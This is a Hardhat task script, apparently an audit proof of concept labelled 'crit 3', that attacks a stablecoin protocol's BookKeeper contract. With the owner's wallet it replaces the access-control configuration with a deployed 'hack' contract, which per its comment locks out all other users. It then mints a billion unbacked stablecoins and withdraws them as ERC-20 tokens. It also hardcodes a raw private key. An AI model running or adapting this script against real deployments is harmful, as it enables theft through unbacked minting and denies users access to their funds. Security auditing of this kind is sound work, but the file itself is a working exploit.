import { task } from "hardhat/config";
import { Wallet } from "ethers";
import addresses from '../addresses.json';

task("C3", "crit 3")
  .setAction(async (taskArgs, { ethers }) => {
    // account
    const accountOwnerContracts = new ethers.Wallet('2a8dea9595bd82f62eb12ed0c61aea5cc9ab309827dd34e28c775ed53d295646', ethers.provider);
    const accountAddressOwnerContracts = accountOwnerContracts.address;

    // contracts
    const bookKeeper = new ethers.Contract(addresses['bookKeeper'], require("../build/contracts/BookKeeper.json").abi, accountOwnerContracts);
    const stablecoinAdapter = new ethers.Contract(addresses['stablecoinAdapter'], require("../build/contracts/StablecoinAdapter.json").abi, accountOwnerContracts);
    const stablecoinERC20 = new ethers.Contract(await stablecoinAdapter.stablecoin(), require("../build/contracts/ERC20.json").abi, accountOwnerContracts);

    // 1. deploy hack contract
    const accessControlConfigHack = await ethers.deployContract("AccessControlConfigHack", [], accountOwnerContracts);
    await accessControlConfigHack.waitForDeployment();

    console.log('start balanceOf', ethers.formatEther(await stablecoinERC20.balanceOf(accountAddressOwnerContracts)));

    // 2. set hack AccessControlConfig
    await bookKeeper.setAccessControlConfig(accessControlConfigHack.target);
    // The owner gained access to all roles. But the others lost all access. It is impossible to put up collateral and take on debt.

    const amount = '1000000000'; // amount of stablecoins

    // 3. mint stablecoins to bookKeeper on my address
    await bookKeeper.mintUnbackedStablecoin(accountAddressOwnerContracts, accountAddressOwnerContracts, ethers.parseUnits(amount, 45));

    // 4. mint stablecoins ERC-20 on my address
    await stablecoinAdapter.withdraw(accountAddressOwnerContracts, ethers.parseUnits(amount, 18), '0x00');

    console.log('start balanceOf', ethers.formatEther(await stablecoinERC20.balanceOf(accountAddressOwnerContracts)));
});